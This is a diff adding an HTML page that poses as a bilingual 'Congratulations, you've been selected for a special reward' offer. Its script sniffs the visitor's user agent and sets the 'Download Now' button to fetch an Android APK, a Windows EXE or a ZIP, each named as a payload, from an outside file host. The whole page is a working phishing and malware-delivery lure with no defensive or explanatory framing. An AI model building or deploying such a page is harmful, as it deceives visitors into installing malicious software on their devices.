@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🎁 Your Reward Awaits</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1 id="main-title">🎉 Congratulations!</h1>
+    <p id="main-text">You’ve been selected for a special reward.</p>
+    <a id="download-link" href="#" download>
+      <button id="download-button">Download Now</button>
+    </a>
+    <div class="language-switch">
+      <button onclick="switchLang('en')">English</button>
+      <button onclick="switchLang('fr')">Français</button>
+    </div>
+  </div>
+
+  <script>
+    const links = {
+      android: "https://0x0.st/android_payload.apk",
+      windows: "https://0x0.st/windows_payload.exe",
+      default: "https://0x0.st/generic_payload.zip"
+    };
+
+    const translations = {
+      en: {
+        title: "🎉 Congratulations!",
+        message: "You’ve been selected for a special reward.",
+        button: "Download Now"
+      },
+      fr: {
+        title: "🎉 Félicitations !",
+        message: "Vous avez été sélectionné(e) pour une récompense spéciale.",
+        button: "Télécharger"
+      }
+    };
+
+    function detectPlatform() {
+      const ua = navigator.userAgent.toLowerCase();
+      if (ua.includes("android")) return "android";
+      if (ua.includes("windows")) return "windows";
+      return "default";
+    }
+
+    function setDownloadLink() {
+      const platform = detectPlatform();
+      const link = links[platform] || links.default;
+      document.getElementById("download-link").href = link;
+    }
+
+    function switchLang(lang) {
+      document.getElementById("main-title").innerText = translations[lang].title;
+      document.getElementById("main-text").innerText = translations[lang].message;
+      document.getElementById("download-button").innerText = translations[lang].button;
+    }
+
+    // Init
+    setDownloadLink();
+  </script>
+</body>
+</html>
